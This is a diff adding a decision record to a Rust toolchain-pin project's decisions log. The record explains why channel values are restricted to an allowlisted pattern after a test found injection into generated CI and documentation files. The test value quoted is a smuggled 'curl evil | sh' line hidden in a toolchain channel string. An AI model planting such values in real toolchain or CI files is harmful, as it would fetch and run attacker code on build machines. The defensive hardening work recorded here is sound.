@@ -241,3 +241,14 @@
 - **Confidence:** high · **Would reverse if:** a rustup release is shown to read a multi-line legacy file's first line as its channel
 - **Written to:** specs/001-rust-cargo-adopt/spec.md (TG3), specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/plan.md
 - **Status:** standing
+
+## D23 — Converge: a pinned channel holding a newline, a space or a quote — recorded, or not?
+- **Stage:** converge · **Slice:** toolchain-pin · **When:** 2026-10-01T21:40:00Z · **Iteration:** 2
+- **Question:** Converge pass 1 (T011, HIGH) adopted a crate whose `rust-toolchain.toml` says `channel = "1.85\n  script: [\"curl evil | sh\"]"` and saw the newline break out of a comment in the generated GitLab job, the survey page, `adoption.md` and `ground.md`; a quote would break the `toolchain: '<version>'` input `ci-toolchain` writes (D19). rustup refuses every such name (`custom toolchain … is not installed`). Is the channel recorded as written whatever it holds?
+- **Options:** as written, always (TG4's wording read literally) · only where it is a toolchain name a runner can install, `^[A-Za-z0-9][A-Za-z0-9._-]*$`, empty otherwise (recommended by the converge pass)
+- **Decision:** The recommended rule. The version is the channel as written where it matches `^[A-Za-z0-9][A-Za-z0-9._-]*$`, and empty otherwise — never an error, as TG5 says for every other unusable pin. The check is applied once, where the walk returns, so both readers pass through it. Every TG4 shape passes unchanged.
+- **Why:** D21's reason governs again: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing, and rustup reads nothing from these names. Before this slice the Rust version was always empty, so this is the first route from a tree's toolchain file into generated files, and it is closed where it opens. The same class for other ecosystems' pins (`project/adopted_ci.py`'s `setup_steps`, code that was here) is not this slice's and is returned to the delegating session.
+- **Decided by:** drive-slice (converge stage, on D21's stated reason; returned to the delegating session for review)
+- **Confidence:** high · **Would reverse if:** a rustup toolchain name a runner can install is shown to need a character outside the set
+- **Written to:** specs/001-rust-cargo-adopt/spec.md (TG5), specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/tasks.md (T011)
+- **Status:** standing
